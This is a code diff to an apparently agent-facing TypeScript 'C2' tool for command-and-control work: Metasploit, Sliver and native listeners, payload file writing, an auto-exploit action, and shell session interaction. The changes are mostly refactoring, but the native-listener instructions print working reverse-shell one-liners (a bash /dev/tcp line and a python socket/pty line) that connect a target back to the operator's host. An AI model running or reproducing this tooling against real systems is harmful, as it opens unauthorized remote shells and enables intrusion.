@@ -200,7 +200,7 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
   }
 
   async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
-    const c2Input = input as C2Input
+    const c2Input = input as unknown as C2Input
 
     switch (c2Input.action) {
       case 'get_ip':         return this.getIP()
@@ -412,19 +412,22 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
         break
     }
 
-    // 注册监听器
-    const listener: C2Listener = {
-      id: listenerId,
-      name: listenerName,
-      framework,
-      type: listenerType,
-      host: lhost,
-      port: lport,
-      tmuxSession: framework !== 'native' ? `c2_${listenerName}` : undefined,
-      shellSessionId: framework === 'native' ? `shell_${lport}` : undefined,
-      startTime: Date.now(),
+    // Only register listeners that are actually running (msf/sliver via tmux).
+    // Native listeners are managed externally by ShellSession — don't register
+    // a phantom entry that would pollute list_sessions.
+    if (framework !== 'native') {
+      const listener: C2Listener = {
+        id: listenerId,
+        name: listenerName,
+        framework,
+        type: listenerType,
+        host: lhost,
+        port: lport,
+        tmuxSession: `c2_${listenerName}`,
+        startTime: Date.now(),
+      }
+      this.listeners.set(listenerName, listener)
     }
-    this.listeners.set(listenerName, listener)
 
     return { content: result, isError: false }
   }
@@ -553,27 +556,22 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
     ].join('\n')
   }
 
-  private async deployNativeListener(name: string, lhost: string, lport: number, context: ToolContext): Promise<string> {
-    // 使用ShellSession监听原生反弹shell
+  private async deployNativeListener(name: string, lhost: string, lport: number, _context: ToolContext): Promise<string> {
+    // Native listeners are managed by ShellSession tool — C2 generates the instructions
+    // and the caller must NOT register this in this.listeners (nothing is actually running).
     const shellSessionId = `shell_${lport}`
 
     return [
-      `[C2] 原生反弹shell监听器已准备!`,
+      `[C2] 原生反弹shell — 请按以下步骤操作（C2 不直接启动 ShellSession）:`,
       ``,
-      `  框架:       Native (ShellSession)`,
-      `  Session ID: ${shellSessionId}`,
-      `  监听端口:   ${lport}`,
-      ``,
-      `请执行以下步骤:`,
-      ``,
-      `步骤1 - 启动ShellSession监听:`,
+      `步骤1 - 用 ShellSession 启动监听:`,
       `  ShellSession({ action: "listen", port: ${lport} })`,
       ``,
-      `步骤2 - 在目标上执行反弹shell（选择一种）:`,
+      `步骤2 - 在目标上执行反弹shell:`,
       `  bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
       `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
       ``,
-      `步骤3 - 确认连接后执行命令:`,
+      `步骤3 - 连接后执行命令:`,
       `  ShellSession({ action: "exec", session_id: "${shellSessionId}", command: "id" })`,
     ].join('\n')
   }
@@ -639,7 +637,7 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
         }
 
         try {
-          await exec(`cat > ${payloadFile} << 'PAYLOAD_EOF'\n${payloadContent}\nPAYLOAD_EOF`)
+          fs.writeFileSync(payloadFile, payloadContent)
           await exec(`chmod +x ${payloadFile}`)
         } catch (e) {
           return { content: `[C2] 写入payload文件失败: ${(e as Error).message}`, isError: true }
@@ -842,21 +840,15 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
   }
 
   private async interactNativeSession(sessionId: string, command: string): Promise<ToolResult> {
-    // 原生shell通过ShellSession交互
-    // 这里直接通过netcat发送命令
-    const port = parseInt(sessionId.replace('shell_', ''), 10)
-
+    // Native shell sessions are managed by ShellSession tool, not C2Tool.
+    // Direct ShellSession via the session_id — C2 cannot proxy into it.
     return {
       content: [
-        `[C2] 原生shell ${sessionId} 执行命令:`,
+        `[C2] 原生shell ${sessionId} 需要通过 ShellSession 工具交互（C2 无法代理原生 shell）:`,
         ``,
-        `请使用ShellSession工具交互:`,
-        `  ShellSession({ action: "exec", session_id: "${sessionId}", command: "${command}" })`,
-        ``,
-        `或通过Bash直接发送（如果已有nc连接）:`,
-        `  echo "${command}" | nc -w 3 127.0.0.1 ${port}`,
+        `  ShellSession({ action: "exec", session_id: "${sessionId}", command: ${JSON.stringify(command)} })`,
       ].join('\n'),
-      isError: false,
+      isError: true,
     }
   }
 
